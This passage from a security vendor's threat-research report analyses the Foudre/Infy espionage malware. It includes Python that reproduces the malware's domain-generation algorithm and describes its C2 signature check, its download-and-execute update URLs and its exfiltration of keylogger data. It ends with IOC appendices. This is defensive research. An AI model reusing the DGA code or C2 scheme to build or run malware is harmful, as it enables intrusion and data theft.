class="crayon-s">".space"</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">results</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">weeknumber</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">date</span><span class="crayon-sy">.</span><span class="crayon-e">isocalendar</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"NRV1{}{}{}"</span><span class="crayon-sy">.</span><span class="crayon-e">format</span><span class="crayon-sy">(</span><span class="crayon-v">date</span><span class="crayon-sy">.</span><span class="crayon-v">year</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">date</span><span class="crayon-sy">.</span><span class="crayon-v">month</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">weeknumber</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">hostname</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">s</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">host</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">getHostCRC</span><span class="crayon-sy">(</span><span class="crayon-v">hostname</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">domains</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">results</span><span class="crayon-sy">.</span><span class="crayon-e">append</span><span class="crayon-sy">(</span><span class="crayon-v">host</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">d</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">domains</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">range</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">101</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">hostname</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">str</span><span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">host</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">getHostCRC</span><span class="crayon-sy">(</span><span class="crayon-v">hostname</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-i">d</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">results</span><span class="crayon-sy">.</span><span class="crayon-e">append</span><span class="crayon-sy">(</span><span class="crayon-v">host</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">results</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-22">&nbsp;</div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-23"><span class="crayon-e">getDomainsForNextWeeks</span><span class="crayon-sy">(</span><span class="crayon-v">number_of_weeks</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">date</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">datetime</span><span class="crayon-sy">.</span><span class="crayon-v">datetime</span><span class="crayon-sy">.</span><span class="crayon-e">now</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">date</span><span class="crayon-h"> </span><span class="crayon-o">-=</span><span class="crayon-h"> </span><span class="crayon-v">datetime</span><span class="crayon-sy">.</span><span class="crayon-e">timedelta</span><span class="crayon-sy">(</span><span class="crayon-v">days</span><span class="crayon-o">=</span><span class="crayon-cn">7</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">n</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">date_to</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">date</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">datetime</span><span class="crayon-sy">.</span><span class="crayon-e">timedelta</span><span class="crayon-sy">(</span><span class="crayon-v">days</span><span class="crayon-o">=</span><span class="crayon-cn">7</span><span class="crayon-o">*</span><span class="crayon-v">number_of_weeks</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"Generating domains for: {} - {}.\nEach domain can have .space, .net or .top as TLD (top level domain).\n\n"</span><span class="crayon-sy">.</span><span class="crayon-e">format</span><span class="crayon-sy">(</span><span class="crayon-v">date</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">date_to</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-29">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">range</span><span class="crayon-sy">(</span><span class="crayon-v">number_of_weeks</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">tmp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">getDomains</span><span class="crayon-sy">(</span><span class="crayon-v">date</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">top_domains</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">tmp</span><span class="crayon-sy">[</span><span class="crayon-o">:</span><span class="crayon-cn">20</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">weeknumber</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">date</span><span class="crayon-sy">.</span><span class="crayon-e">isocalendar</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"{}. {} - Week Number: {}"</span><span class="crayon-sy">.</span><span class="crayon-e">format</span><span class="crayon-sy">(</span><span class="crayon-v">n</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">date</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">weeknumber</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-e">domain </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">top_domains</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"{}"</span><span class="crayon-sy">.</span><span class="crayon-e">format</span><span class="crayon-sy">(</span><span class="crayon-v">domain</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">date</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-v">datetime</span><span class="crayon-sy">.</span><span class="crayon-e">timedelta</span><span class="crayon-sy">(</span><span class="crayon-v">days</span><span class="crayon-o">=</span><span class="crayon-cn">7</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">n</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">n</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-40"><span class="crayon-e">getDomainsForNextWeeks</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0040 seconds] -->
<p><img class="alignnone size-full wp-image-38932" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_6.png" alt="Princeofpersia_6" width="658" height="668" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_6.png 658w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_6-296x300.png 296w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_6-370x376.png 370w" sizes="(max-width: 658px) 100vw, 658px" /></p>
<p><em>Figure 6 CRC32 code in the DGA algorithm</em></p>
<p>Previous and current C2 domains are detailed in Appendix I. All point at the same C2 server on 198.252.108[.]158, located in Canada, using DNS servers ns1.2daa46f1[.]space and ns2.2daa46f1[.]space.</p>
<p>The DNS RNAME is henry55.iname[.]com, though we were not able to find any other reference to this email address outside of the context of this campaign.</p>
<h3>C2 signature verification</h3>
<p>Foudre uses the lockbox3 Delphi library to verify the C2:</p>
<ol>
<li>Download signature file from the generated domain name C2 with GET request:<br />
GET /de/?d=2017149&amp;t=2017%2D5%2D29%2D%2D12%2D16%2D33<br />
d= {year}{number of days since the beginning of the year}<br />
t = Current time, urlencoded.</li>
<li>Save the signature in %appdata%\sig.tmp.</li>
<li>Write the clear text string<br />
{domainname}{year}{number of days since the beginning of the year}<br />
in %appdata%\dom.tmp.<br />
The current date is downloaded from http://feeds.skynews[.]com/feeds/rss/home.xml &lt;lastBuildDate&gt; field.</li>
<li>Decrypt the signature file with the public key (stored in %all users%\application data\snailDriver V&lt;version&gt;\pub.key)</li>
<li>Compare the result with the dom.tmp clear text string.</li>
</ol>
<p><img class="alignnone size-full wp-image-38956" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_7.png" alt="Princeofpersia_7" width="572" height="824" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_7.png 572w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_7-208x300.png 208w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_7-370x533.png 370w" sizes="(max-width: 572px) 100vw, 572px" /></p>
<p><em>Figure 7 Download Signature Verification</em></p>
<p>After the domain is verified, it checks if a new trojan update version is needed with these posts:</p>
<p>&nbsp;</p>
<p class="p1" style="padding-left: 30px;"><span class="s1"><a href="http://%3Cc2domain%3E/">http://&lt;C2domain&gt;/</a></span><span class="s2"><b>2014</b>/?c=&lt;computername&gt;&amp;u=&lt;username&gt;&amp;v=&lt;version&gt;&amp;s=&lt;password&gt;&amp;f=&lt;folder&gt;&amp;mi=&lt;machineguid_urlencoded&gt;&amp;b=&lt;32/64bit&gt;&amp;t=&lt;time_urlencoded&gt;</span></p>
<p class="p1" style="padding-left: 30px;"><span class="s1"><a href="http://%3Cc2domain%3E/">http://&lt;C2domain&gt;/</a></span><span class="s2"><b>2015</b>/?c=&lt;computername&gt;&amp;u=&lt;username&gt;&amp;v=&lt;version&gt;&amp;s=&lt;password&gt;&amp;f=&lt;folder&gt;&amp;mi=&lt;machineguid_urlencoded&gt;&amp;b=&lt;32/64bit&gt;&amp;t=&lt;time_urlencoded&gt;</span></p>
<p>The first request (2014 folder) downloads any new trojan version to %temp%\gtsdch32.tmp. The second request (2015 folder) downloads a second signature file to %temp%\gtsdci32.tmp.</p>
<p>The malware then performs a second RSA signature verification using the public key. If the verification is successful, the new trojan version (gtsdch32.tmp) is executed with this command line:</p>
<p style="padding-left: 30px;">gtsdch32.tmp -sp/set -pRBA4b5a98Q</p>
<p>We observed a very similar command structure in the original Infy malware:<br />
&#8220;<em>sp/ins -pBA5a88E</em>&#8220;.</p>
<p>One of the update parameters (download and execute) contains references indicating that there is also a 64bit version of Foudre.</p>
<p>We also found that the request &lt;C2&gt;/f/?d=&lt;filename&gt; is redirected to &lt;C2&gt;/f/&lt;filename&gt;.tmp. This parameter is not supported by the agent, so it is likely a server-side redirection used by the update mechanism.</p>
<p>The malware then encrypts the keylogger data and system information, and sends to the C2 with this post:</p>
<p style="padding-left: 30px;">http://&lt;C2&gt;/en/d=&lt;date&gt;,text=&lt;data&gt;</p>
<h3>Mapping the victims</h3>
<p>We forecast one of the DGA domain names and registered it before the adversary.</p>
<p>The victims attempted to connect to a C2 on that domain, but without the RSA private key we could not verify our domain to them. However, we are able to map the victim locations using GeoIP (Figure 8).</p>
<p>We note a preponderance of Iranian-domestic victims, very reminiscent of the Infy campaigns. Efforts against the United States and Iraq are also familiar. And once again, the very small number of targets hints at a non-financial motivation.</p>
<p>One of the Iraq victims uses an IP in the same class C network as one of an observed Infy victim, suggesting that the adversary is targeting the same specific organization, or even computer.</p>
<p><img class="alignnone size-full wp-image-38980" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_8.png" alt="Princeofpersia_8" width="903" height="915" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_8.png 903w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_8-900x912.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_8-296x300.png 296w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_8-768x778.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_8-370x375.png 370w" sizes="(max-width: 903px) 100vw, 903px" /></p>
<p><em>Figure 8 Geographic spread of victims</em></p>
<p>Although without the RSA private key, we were unable to establish communications with any victims, we discovered that by sending an invalid signature file to the victim, owing to a lack of input validation of the signature file content/size, we can crash the rundll32 process running the Foudre malicious DLL, disabling the infection until the victim reboots.</p>
<h3>Conclusion</h3>
<p>In our <a href="https://researchcenter.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/">Prince of Persia blog</a>, we noted that this campaign had been active for at least a decade. We followed up with our <a href="https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/">Prince of Persia: Game Over blog</a>, documenting our takedown and sinkholing of the adversary’s C2 infrastructure.</p>
<p>Regarding the actions by the Telecommunication Company of Iran to prevent the C2s from resolving to our sinkhole,  Guarnieri &amp; Anderson <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Guarnieri-Iran-And-The-Soft-War-For-Internet-Dominance-wp.pdf">note</a> “<em>The filtering policy indicates that Iranian authorities had specifically intervened to block access to the command and control domains of a state ­aligned intrusion campaign at a country level</em>”.</p>
<p>We shouldn’t be surprised then to see Infy return – fundamentally the same malware, targeting the same victims.</p>
<p>The actors understand that they needed a more robust C2 infrastructure to prevent infiltration and takedown. DGA adds some resilience, but is not impervious to takeover.</p>
<p>However, using digital signing is an effective C2 defense mechanism. Without access to the private keys, it’s not possible to impersonate a C2 even if a DGA domain is registered by a researcher. It’s possible that the private keys are held locally on the C2 server, but without access to the C2 we can’t confirm this particular potential vulnerability in their infrastructure.</p>
<p>Prince of Persia is persistent, indeed.</p>
<h3>Coverage</h3>
<p>Palo Alto Networks customers are protected from this threat in the following ways:</p>
<ol>
<li>WildFire accurately identifies all malware samples related to this operation as malicious.</li>
<li>Traps prevents this threat on endpoints, based upon WildFire prevention.</li>
<li>Domains used by this operation have been flagged as malicious in Threat Prevention.</li>
</ol>
<p>AutoFocus users can view malware related to this attack using the “Foudre” tag.</p>
<p>IOCs can be found in the appendices of this report.</p>
<h3>Appendix I – C2 infrastructure IoCs</h3>
<p>As of time of publishing, the actor had registered DGA domains corresponding to dates through end-July 2017. Although the DGA algorithm allows the Top-Level Domains (TLDs) of “.space”, ”.net” and “.top”, we note predominantly “.space” domain registrations, just one “.top”, and no “.net”. Of special interest is multiple “.site” domains resolving to the C2 IP address. We suspect that this may be different malware – possibly, as we saw with the previous Prince of Persia investigations, an as-yet unidentified more full-featured Infy/Foudre variant.</p>
<p>ns1.2daa46f1[.]space</p>
<p>ns2.2daa46f1[.]space</p>
<p>017eab31[.]space</p>
<p>01ead12b[.]space</p>
<p>0ca0453a[.]site</p>
<p>14c7e2dc[.]space</p>
<p>15bb747b[.]site</p>
<p>15ce27c5[.]site</p>
<p>16e53040[.]space</p>
<p>17ecf559[.]site</p>
<p>1cb3c4c0[.]space</p>
<p>1d4ee030[.]space</p>
<p>23dafa1e[.]space</p>
<p>2daa46f1[.]space</p>
<p>341a436d[.]space</p>
<p>3828b6ed[.]site</p>
<p>39451f31[.]space</p>
<p>3a6e08b4[.]site</p>
<p>3c6e6571[.]space</p>
<p>3e8718c3[.]site</p>
<p>3f4572f4[.]site</p>
<p>431d73fb[.]space</p>
<p>43ec206d[.]top</p>
<p>4b6955e7[.]space</p>
<p>4e422fa7[.]space</p>
<p>4f2f867b[.]site</p>
<p>5aad7667[.]space</p>
<p>60ebc5cf[.]site</p>
<p>61e200d6[.]space</p>
<p>62c91753[.]site</p>
<p>63c0d24a[.]space</p>
<p>6bb4f456[.]space</p>
<p>76ede1bd[.]space</p>
<p>7ba775ac[.]site</p>
<p>8447b18a[.]space</p>
<p>869182ff[.]site</p>
<p>884efdfb[.]space</p>
<p>8cc7767f[.]site</p>
<p>8dceb366[.]space</p>
<p>8ee5a4e3[.]site</p>
<p>8fec61fa[.]space</p>
<p>9155ccba[.]space</p>
<p>9877fa8b[.]space</p>
<p>98e38091[.]space</p>
<p>9c1f58ab[.]site</p>
<p>9f233843[.]space</p>
<p>a20af0d2[.]space</p>
<p>a367590e[.]site</p>
<p>a4a55efc[.]space</p>
<p>a64c234e[.]site</p>
<p>b4a3174b[.]space</p>
<p>c4c9e3c4[.]space</p>
<p>c5aeee9c[.]site</p>
<p>d14b13d8[.]site</p>
<p>d260045d[.]space</p>
<p>d3a26e6a[.]space</p>
<p>d4606998[.]site</p>
<p>d50dc044[.]space</p>
<p>d74b7e1d[.]space</p>
<p>e00dc810[.]space</p>
<p>e652fc2c[.]space</p>
<p>eb18683d[.]site</p>
<p>f196b269[.]site</p>
<p>f8eb516c[.]space</p>
<p>f9e29475[.]site</p>
<p>fac983f0[.]space</p>
<p>fbc046e9[.]site</p>
<p>198.252.108[.]158 Hawkhost Canada – Dedicated hosting (all current resolutions malicious).</p>
<p>Note that we identified several other IP addresses historically related to some of these domains, but research concludes that these are registrar-default hosts rather than C2 servers.</p>
<h3>Appendix II – Hashes</h3>
<p>2b37ce9e31625d8b9e51b88418d4bf38ed28c77d98ca59a09daab01be36d405a<br />
4d51a0ea4ecc62456295873ff135e4d94d5899c4de749621bafcedbf4417c472<br />
7ce2c5111e3560aa6036f98b48ceafe83aa1ac3d3b33392835316c859970f8bc<br />
7e73a727dc8f3c48e58468c3fd0a193a027d085f25fa274a6e187cf503f01f74<br />
da228831089c56743d1fbc8ef156c672017cdf46a322d847a270b9907def53a5<br />
6bc9f6ac2f6688ed63baa29913eaf8c64738cf19933d974d25a0c26b7d01b9ac<br />
7c6206eaf0c5c9c6c8d8586a626b49575942572c51458575e51cba72ba2096a4<br />
db605d501d3a5ca2b0e3d8296d552fbbf048ee831be21efca407c45bf794b109</p>
<h3>Appendix III – RSA signature verifying</h3>
<p>Replicating the malicious c2 server domain 39451f31[.]space:</p>
<p><strong>dom file:</strong></p>
<p>39451f31.space2017138</p>
<p><strong>sig file:</strong></p>
<p>089EABE330EFD99602C164E889B44E16B8284BB1834A29F16C4BE8CE52FF507F9592E541DBEF85F3C15312583057CB1151B4027C22FB9A776CA112E4922D9BEB03D6682393350C9CE3BAABD92F02D620D81CCF38430AB340B048BE230240AACDB93F7AC8B96BFEDF68B8D2964558E6B9BC5E6BC361A876B71FB54A45CFA9E327B335CEDF34DB904E70CBBD1C5468411AC0677956156643209649D6551427652FC7C8487490D69CEE5DAB6B8B46764214B21E5B8E9AF866AF95CB883523B534412E07D25A956438DC249F15AEB7238CDC87A1B3BB020A096A8BCC9F4CED0554470DCA45638382C24BD2F37767D0546A6C57E8D27679CD1C332AE744A1FDBBB771</p>
<p><strong>public key</strong></p>
<p>4E0A4C6F636B426F783301000000030001000015DEAED84DB7C292D7DEB01D5EB8DBE40A289736E9050B60E11DF90AAEEA6D1504D1D5056A50D1C44E3E03A8294E226C947D667B491896C151D5BEF32931636881ED635ACBDF18F8ED48BC680FFA31D60CAAF4EFAB772737081A6BD6B3D6D74DC57394095B340F492BE9E11115E67B1EF6B278ABA92055EB68D5138FF64CD9C3433DD8A4EA5A9EE3BAF0BF9D2A334CA6979941E676C13B3DE015D68070E43E8D6442CA677AA53E3CF27FB1957B7AFA03044BDB143726EBB4BE27CCEAD5AF89E966E646B43913EF873C08B488B6D5140914869A133379B9753B5E046E462D18DB692EA3A263F3694AF37DDC388737581F12701BF75061940877C886F05AB9237B030000000100014E0A4C6F636B426F7833010000000300010000E915DED8174C9B15D81DA2BA072DD858F9641B294BEB78A98E88AFC4A060161B16BBA30881F50E33B8552A449ECCAB8917F4E07359E70D5D19272026A486DB1F39E73903422F0ECB072DACB7B71955726301D25E50507524A6AB50C4C60718F32A2F546AE764B149E271A52CFBD2A60F3795588A6436DC08F881B931130A0444F2F2A30C74CA24A1F153F6012E46FA5047355114E3BD67FC3E32A1CE6711460C96D2470D787E8DDAF9F12C58A8A1264B27917A7F13F19B6B7D3347D40A486EB68FDA1653A5808B9380026B1B4B6AF640F7C8ECAF9A5FD77E571494D7152038545B7E53704A14CFED581BBC579DDF542247F110CAF70194ADBDB114314EE4716303000000010001</p>
<p>&nbsp;</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
